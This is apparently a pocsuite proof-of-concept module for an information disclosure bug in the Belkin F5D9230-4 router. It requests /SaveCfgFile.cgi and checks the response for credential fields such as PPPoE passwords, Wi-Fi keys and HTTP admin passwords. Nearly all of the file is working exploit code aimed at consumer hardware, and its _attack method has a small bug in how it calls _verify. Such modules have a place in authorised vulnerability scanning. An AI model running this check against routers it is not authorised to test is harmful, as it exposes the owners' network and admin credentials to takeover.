#!/usr/bin/python
# -*- coding: utf-8 -*-

from pocsuite.api.request import req
from pocsuite.api.poc import Output, POCBase
from pocsuite.api.poc import register
import re


class TestPOC(POCBase):
    name = "Belkin G Info Disclosure"
    vulID = ''
    author = ['sebao']
    vulType = 'Info Disclosure'
    version = '1.0'  # default version: 1.0
    references = 'https://www.exploit-db.com/exploits/4941/'
    desc = 'Module exploits Belkin Wireless G Plus MIMO Router F5D9230-4 information disclosure vulnerability which allows fetching sensitive information such as credentials.'


    vulDate = ''
    createDate = '2017-10-13'
    updateDate = '2017-10-13'

    appName = 'belkin'
    appVersion = 'Belkin G'
    dork = ''
    appPowerLink = 'http://www.belkin.com'
    samples = []

    def _attack(self):

        return self._verify(self)

    def _verify(self):
        '''verify mode'''
        result = {}
        url = self.url + '/SaveCfgFile.cgi'
        resp = req.get(url)
        var = [
            'pppoe_username',
            'pppoe_password',
            'wl0_pskkey',
            'wl0_key1',
            'mradius_password',
            'mradius_secret',
            'httpd_password',
            'http_passwd',
            'pppoe_passwd'
        ]

        if any(map(lambda x: x in resp.content, var)):
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = url

        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)
